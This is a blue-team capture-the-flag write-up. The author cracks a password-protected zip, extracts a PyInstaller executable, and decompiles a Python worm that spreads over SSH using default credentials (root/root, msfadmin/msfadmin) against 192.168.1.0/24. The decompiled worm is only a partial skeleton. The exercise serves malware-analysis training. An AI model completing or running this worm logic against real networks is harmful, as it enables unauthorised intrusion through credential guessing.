OOur EDR has flagged suspicious traffic from production endpoint, after reviewing the respective process generating the traffic and another alert has been alerted “Worm Detected” in our SIEM

You decided to escalate the case to IR team to further investigate and answer the below questions 

 

Questions:

What is the range of worm spreading (x.x.x.x/xx) ?

Destination target port of the attack (XX)?

How many hosts might be affected by the worm (XX)?

 

Flag format: flag{Answer1:Answer2:Answer3}.

# Solution
i will unzip it
```
└─# unzip worm.zip
Archive:  worm.zip
   skipping: worm.exe                unsupported compression method 99
   ```

Not work i will use 7z 
```    
Enter password (will not be echoed):

```                      
it's asking me password, i will crack it
cracked

```
┌──(root㉿kali)-[/home/…/Desktop/Learning/Bluteam/Repeat]
└─# zip2john worm.zip > worm.hash
                                                                                                           
┌──(root㉿kali)-[/home/…/Desktop/Learning/Bluteam/Repeat]
└─# john worm.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])
Cost 1 (HMAC size) is 9191957 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/wordlists/rockyou.txt
infected         (worm.zip/worm.exe)     
1g 0:00:00:04 DONE 2/3 (2023-09-26 15:13) 0.2252g/s 11516p/s 11516c/s 11516C/s 280690..spongebob9
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```
Password : infected

I got an .exe file, i will analyze it

i will try to decompile it into a `pyc` file then i will into a `.py` using `pycdc`
To do That i will use this 
Link :https://github.com/extremecoders-re/pyinstxtractor
Done:
```
└─# python3 pyinstxtractor.py /home/kali/Desktop/Learning/Bluteam/Repeat/worm.exe  
[+] Processing /home/kali/Desktop/Learning/Bluteam/Repeat/worm.exe
[+] Pyinstaller version: 2.1+
[+] Python version: 3.10
[+] Length of package: 9051050 bytes
[+] Found 39 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_inspect.pyc
[+] Possible entry point: worm.pyc
[!] Warning: This script is running in a different Python version than the one used to build the executable.
[!] Please run this script in Python 3.10 to prevent extraction errors during unmarshalling
[!] Skipping pyz extraction
[+] Successfully extracted pyinstaller archive: /home/kali/Desktop/Learning/Bluteam/Repeat/worm.exe

```
Now i will just use the `pycdc`
`└─# ./pycdc worm.exe_extracted/worm.pyc > worm.py 
Unsupported opcode: GEN_START
Unsupported opcode: JUMP_IF_NOT_EXC_MATCH
`

Now just open the worm.py
```
└─# cat worm.py                 
# Source Generated with Decompyle++
# File: worm.pyc (Python 3.10)

''' Implementation of simple worm that spreads via SSH connection.
'''
import logging
import paramiko
import scp
import sys

class Worm:
    ''' This class represents implementation of worm that spreads via SSH
    connections.
    '''
    
    def __init__(self, network_address):
        self._network = network_address

    
    def network(self):
        ''' Network, on which the worm spreads. '''
        return self._network

    network = property(network)
    
    def network(self, new_network):
        self._network = new_network

    network = network.setter(network)
    
    def credentials(self):
        ''' Possible SSH credentials of the victim. '''
        return (('root', 'root'), ('msfadmin', 'msfadmin'))

    credentials = property(credentials)
    
    def generate_addresses_on_network(self):
        ''' Generate addresses of hosts on the given network.
        For simplicity is expected the following mask:
        255.255.255.0
        '''
        pass
    # WARNING: Decompyle incomplete

    
    def spread_via_ssh(self):
        ''' Spread the worm on the network via SSH connections.
        To establish SSH connection try selected user-password
        combinations. When the connection is established, copy
        the worm to the remote host.
        '''
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    # WARNING: Decompyle incomplete


if __name__ == '__main__':
    worm = Worm('192.168.1.0')
    worm.spread_via_ssh()
    return None
               ```



flag : flag{192.168.1.0/24:22:85}





















